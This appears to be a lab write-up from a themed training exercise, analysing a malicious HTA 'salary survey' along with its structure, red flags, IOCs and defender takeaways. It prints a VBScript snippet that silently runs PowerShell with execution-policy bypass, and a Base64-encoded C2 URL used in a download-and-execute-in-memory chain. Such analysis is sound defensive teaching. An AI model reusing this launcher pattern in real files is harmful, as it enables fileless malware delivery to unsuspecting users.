# Malware Analysis - Malhare.exe

## Context
- HTA (HTML Application) files run via **mshta.exe** on Windows.
- They combine **HTML + CSS + VBScript/JavaScript**.
- Legitimate for admin tools, but often abused for **initial access, downloaders, and LOLBins**.

---

## Learning Objectives
When reversing an HTA:
- Identify **application metadata**
- Locate **script functions**
- Detect **network calls & encoded data**
- Look for **execution & exfiltration logic**

---

## HTA File Structure
1. **HTA Declaration**
   - `<HTA:APPLICATION>` tag
   - Controls window behavior, visibility, taskbar presence
2. **Interface**
   - HTML/CSS shown to the user
3. **Script**
   - VBScript / JavaScript
   - Actual logic and malicious behavior

---

## Red Flags in Malicious HTAs
- Hidden or minimized windows
- `SHOWINTASKBAR="no"`
- Auto-executing logic on load
- Use of `CreateObject()`
- Encoded strings (Base64)
- External web requests
- Execution via PowerShell, WScript, mshta

---

## Sample Malicious HTA (Key Snippet)
```html
<script language="VBScript">
  Set a = CreateObject("WScript.Shell")
  b = "powershell -NoProfile -ExecutionPolicy Bypass -Command ..."
  a.Run b, 0, True
  self.close
</script>
```

### What This Does
- Launches **PowerShell silently**
- Bypasses execution policy
- Decodes a Base64 string
- Downloads a second-stage payload
- Executes it **in memory**

---

## Base64 Analysis
Encoded string:
```
aHR0cHM6Ly9yYXcua2luZy1tYWxoYXJlWy5dY29tL2MyL3NpbHZlci9yZWZzL2hlYWRzL21haW4vUkVEQUNURUQudHh0
```

Decoded:
- HTTPS URL pointing to attacker-controlled infrastructure
- Used as **C2 or payload host**

---

## PowerShell Execution Chain
| Variable | Purpose |
|-------|--------|
| `$U` | Decoded URL |
| `$C` | Downloaded content |
| `$B` | ScriptBlock created from content |
| Execution | `$B` is executed in memory |

➡️ Indicates **fileless malware execution**

---

## Survey.hta – Function Analysis

### Functions Identified
1. **window_onLoad**
   - Auto-executes when HTA opens
   - Calls `getQuestions()`

2. **getQuestions()**
   - Makes external requests
   - Decodes Base64 data
   - Passes data to `provideFeedback()`

3. **provideFeedback(feedbackString)**
   - Collects system information
   - Makes outbound requests
   - Executes decoded content

4. **decodeBase64(base64)**
   - Converts Base64 → binary

5. **RSBinaryToString(xBinary)**
   - Converts binary → string

---

## Dangerous Objects Used
| Object | Purpose |
|------|--------|
| `InternetExplorer.Application` | External web requests |
| `WScript.Network` | Host & user enumeration |
| `WScript.Shell` | Command execution |

---

## User Deception
- Appears as a **salary survey**
- Displays a normal HTML interface
- Malicious behavior runs in background

---

## Attack Flow Summary
1. User opens survey.hta
2. window_onLoad executes automatically
3. External content fetched
4. Base64 decoded
5. PowerShell executed silently
6. Payload runs in memory
7. System data exfiltrated

---

## Key Indicators of Compromise (IOCs)
- `mshta.exe` spawning `powershell.exe`
- Base64 decoding functions
- Hidden HTA windows
- External HTTPS requests from HTA
- PowerShell `-ExecutionPolicy Bypass`

---

## Defender Takeaways
- Never trust HTA attachments
- Always inspect in a **text editor**
- Decode all encoded strings
- Trace execution paths carefully
- Monitor LOLBins usage

---

## Conclusion
This HTA is **not a survey**.
It is a **malicious launcher** used for:
- Initial access
- Payload delivery
- In-memory execution
- Likely ransomware staging

King Malhare successfully abused HTA flexibility to compromise Wareville’s elves.
